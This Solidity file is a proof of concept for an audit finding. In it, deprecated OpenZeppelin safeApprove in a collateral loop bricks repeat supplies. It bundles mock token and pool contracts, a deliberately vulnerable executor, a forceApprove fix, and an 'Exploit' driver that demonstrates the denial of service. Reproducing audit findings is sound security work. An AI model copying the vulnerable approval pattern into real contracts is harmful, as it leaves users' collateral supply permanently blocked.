// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Hyperlend finding 63922:
// "[H-01] Deprecated safeApprove() usage blocks collateral approval to pool".
//
// The collateral loop in executeOperation() approves the lending pool for the
// FULL uint256 max on every iteration with OpenZeppelin@v4.9.6's DEPRECATED
// SafeERC20.safeApprove(). safeApprove reverts unless the value is 0 OR the
// current allowance is 0:
//
//     require((value == 0) || (token.allowance(this, spender) == 0), "…");
//
// The first executeOperation() for a token sets allowance 0 -> max and supplies
// the collateral (which spends part of that max, leaving it non-zero). The
// SECOND executeOperation() for the SAME token then hits safeApprove with
// value = max (!= 0) AND a non-zero residual allowance, so the require reverts
// with "SafeERC20: approve from non-zero to non-zero allowance". Every later
// collateral supply through this path is permanently bricked for that token —
// a liveness DoS, no funds stolen.
//
// FIDELITY:
//  * The vulnerable executeOperation() collateral loop is inlined VERBATIM from
//    the finding (see the `// @>` line).
//  * SafeERC20 / Address / IERC20 are the VERBATIM OpenZeppelin v4.9.x source
//    (safeApprove / safeTransferFrom / forceApprove / _callOptionalReturn are
//    byte-identical to the audited v4.9.6). This is the vulnerable boundary and
//    is NOT mocked.
//  * Only the opaque external boundaries are doubled with minimal faithful
//    contracts: a standard ERC20 collateral token, and an Aave-style lending
//    pool whose supply() pulls the collateral from the caller (spending the
//    executor -> pool allowance, so it stays non-zero after the first supply).
// ─────────────────────────────────────────────────────────────────────────────

// ===== VERBATIM OpenZeppelin v4.9.x: IERC20 =====
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// ===== VERBATIM OpenZeppelin v4.9.x: IERC20Permit (referenced by SafeERC20.safePermit) =====
interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);

    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

// ===== VERBATIM OpenZeppelin Contracts (last updated v4.9.0) utils/Address.sol =====
library Address {
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

// ===== VERBATIM OpenZeppelin Contracts (last updated v4.9.x) token/ERC20/utils/SafeERC20.sol =====
// This is the vulnerable boundary. safeApprove is deprecated and reverts on any
// non-zero -> non-zero allowance change. Reproduced byte-identical to v4.9.6.
library SafeERC20 {
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, oldAllowance + value));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, oldAllowance - value));
        }
    }

    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        bytes memory approvalCall = abi.encodeWithSelector(token.approve.selector, spender, value);

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
            _callOptionalReturn(token, approvalCall);
        }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        require(returndata.length == 0 || abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
    }

    function _callOptionalReturnBool(IERC20 token, bytes memory data) private returns (bool) {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We cannot use {Address-functionCall} here since this should return false
        // and not revert is the subcall reverts.

        (bool success, bytes memory returndata) = address(token).call(data);
        return
            success && (returndata.length == 0 || abi.decode(returndata, (bool))) && Address.isContract(address(token));
    }
}

// ===== Aave-style lending pool interface (the collateral loop calls this) =====
interface IPool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal doubles for the opaque external boundaries.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Standard minimal ERC20 (the opaque collateral token). transferFrom
///      decrements the allowance on every spend (a legitimate standard-ERC20
///      behaviour), so after the pool pulls the collateral the executor's
///      allowance to the pool is max - amount: still non-zero. (Even a token
///      that keeps an infinite max allowance would leave it at max, i.e. also
///      non-zero — the safeApprove revert triggers either way.)
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal Aave-style lending pool (the opaque lending core, out of scope).
///      supply() pulls `amount` of the asset from the CALLER (the executor) into
///      the aToken vault, spending the executor -> pool allowance created by
///      safeApprove. This is exactly the "pool.supply consumes the allowance"
///      behaviour of the real Aave pool.
contract MockPool is IPool {
    address public immutable aToken; // where supplied collateral is escrowed

    constructor(address _aToken) {
        aToken = _aToken;
    }

    function supply(address asset, uint256 amount, address /*onBehalfOf*/, uint16 /*referralCode*/) external {
        IERC20(asset).transferFrom(msg.sender, aToken, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: the executeOperation() collateral loop, VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
struct CollateralAction {
    IERC20 token;
    uint256 amount;
}

contract CollateralExecutor {
    using SafeERC20 for IERC20;

    IPool public pool;

    constructor(IPool _pool) {
        pool = _pool;
    }

    function executeOperation(CollateralAction[] memory _collateralActions) external {
        for (uint256 i = 0; i < _collateralActions.length; ++i){
            uint256 amount = _collateralActions[i].amount;
            IERC20 token = _collateralActions[i].token;

            //transfer tokens from the caller & approve pool contract to spend them
            token.safeTransferFrom(msg.sender, address(this), amount);
            token.safeApprove(address(pool), type(uint256).max); // @> deprecated safeApprove reverts once allowance is non-zero, permanently bricking collateral supply for this token

            //supply tokens on behalf of the msg.sender
            pool.supply(address(token), amount, msg.sender, 0);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: identical loop but with forceApprove() (the report's fix),
// which resets a non-zero allowance instead of reverting on it.
// ─────────────────────────────────────────────────────────────────────────────
contract CollateralExecutorFixed {
    using SafeERC20 for IERC20;

    IPool public pool;

    constructor(IPool _pool) {
        pool = _pool;
    }

    function executeOperation(CollateralAction[] memory _collateralActions) external {
        for (uint256 i = 0; i < _collateralActions.length; ++i){
            uint256 amount = _collateralActions[i].amount;
            IERC20 token = _collateralActions[i].token;

            token.safeTransferFrom(msg.sender, address(this), amount);
            token.forceApprove(address(pool), type(uint256).max); // FIX: forceApprove tolerates a non-zero allowance

            pool.supply(address(token), amount, msg.sender, 0);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: prove the collateral-supply DoS.
//   1. First executeOperation() for the token succeeds (allowance 0 -> max,
//      then max -> max-amount after the pool pulls the collateral).
//   2. Second executeOperation() for the SAME token reverts inside safeApprove
//      with the non-zero-to-non-zero allowance error -> permanent liveness DoS.
//   3. The fixed variant (forceApprove) allows repeated supply -> negative control.
// The harm (collateral amount now un-suppliable per call) is recorded on a
// MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant ATOKEN = address(0xA70C); // collateral escrow vault

    uint256 internal constant AMOUNT = 100 ether;
    string internal constant EXPECTED_REVERT = "SafeERC20: approve from non-zero to non-zero allowance";

    // --- deployed doubles / vulnerable + fixed contracts (created in constructor) ---
    MiniToken public collateral;
    MockPool public pool;
    CollateralExecutor public executor;
    MiniToken public marker;
    MiniToken public collateral2;
    MockPool public pool2;
    CollateralExecutorFixed public executorFixed;

    // --- exposed results the driver asserts on ---
    bool public vulnFirstCallOk;
    bool public vulnSecondCallReverted;
    string public vulnRevertReason;
    uint256 public allowanceAfterFirst;
    bool public fixedFirstCallOk;
    bool public fixedSecondCallOk;
    uint256 public blockedAmount;
    uint256 public sinkMarkerBalance;

    address public collateralAddr;
    address public poolAddr;
    address public executorAddr;
    address public markerAddr;

    constructor() {
        // Fixed deploy order (index 0 = first). Marker is a plain ERC20 used only
        // to record harm magnitude.
        collateral = new MiniToken("Collateral", "COLL");           // 0
        pool = new MockPool(ATOKEN);                                // 1
        executor = new CollateralExecutor(IPool(address(pool)));    // 2
        marker = new MiniToken("Bricked Collateral Supply", "BRICKED-COLLATERAL"); // 3
        collateral2 = new MiniToken("Collateral2", "COLL2");        // 4
        pool2 = new MockPool(ATOKEN);                               // 5
        executorFixed = new CollateralExecutorFixed(IPool(address(pool2))); // 6

        collateralAddr = address(collateral);
        poolAddr = address(pool);
        executorAddr = address(executor);
        markerAddr = address(marker);
    }

    function run() external payable {
        // ── VULNERABLE path ──────────────────────────────────────────────────
        // Fund the caller (this Exploit) and approve the executor to pull collateral.
        collateral.mint(address(this), 10 * AMOUNT);
        collateral.approve(address(executor), type(uint256).max);

        CollateralAction[] memory actions = new CollateralAction[](1);
        actions[0] = CollateralAction({token: IERC20(address(collateral)), amount: AMOUNT});

        // First supply through executeOperation succeeds.
        try executor.executeOperation(actions) {
            vulnFirstCallOk = true;
        } catch {
            vulnFirstCallOk = false;
        }

        // After the first supply, the executor's allowance to the pool is non-zero.
        allowanceAfterFirst = collateral.allowance(address(executor), address(pool));

        // Second supply for the SAME token reverts inside safeApprove -> DoS.
        try executor.executeOperation(actions) {
            vulnSecondCallReverted = false;
        } catch Error(string memory reason) {
            vulnSecondCallReverted = true;
            vulnRevertReason = reason;
        } catch {
            vulnSecondCallReverted = true;
            vulnRevertReason = "<non-string revert>";
        }

        // ── HARM ─────────────────────────────────────────────────────────────
        require(vulnFirstCallOk, "expected first collateral supply to succeed");
        require(allowanceAfterFirst != 0, "expected non-zero residual pool allowance");
        require(vulnSecondCallReverted, "expected second collateral supply to revert (DoS)");
        require(
            keccak256(bytes(vulnRevertReason)) == keccak256(bytes(EXPECTED_REVERT)),
            "expected safeApprove non-zero-to-non-zero allowance revert"
        );

        // Record the harm: `AMOUNT` collateral now permanently un-suppliable per call.
        blockedAmount = AMOUNT;
        marker.mint(SINK, blockedAmount);
        sinkMarkerBalance = marker.balanceOf(SINK);

        // ── NEGATIVE CONTROL: fixed executor (forceApprove) ──────────────────
        collateral2.mint(address(this), 10 * AMOUNT);
        collateral2.approve(address(executorFixed), type(uint256).max);

        CollateralAction[] memory actions2 = new CollateralAction[](1);
        actions2[0] = CollateralAction({token: IERC20(address(collateral2)), amount: AMOUNT});

        try executorFixed.executeOperation(actions2) {
            fixedFirstCallOk = true;
        } catch {
            fixedFirstCallOk = false;
        }
        try executorFixed.executeOperation(actions2) {
            fixedSecondCallOk = true;
        } catch {
            fixedSecondCallOk = false;
        }

        require(fixedFirstCallOk && fixedSecondCallOk, "fixed variant must allow repeated supply");
    }
}
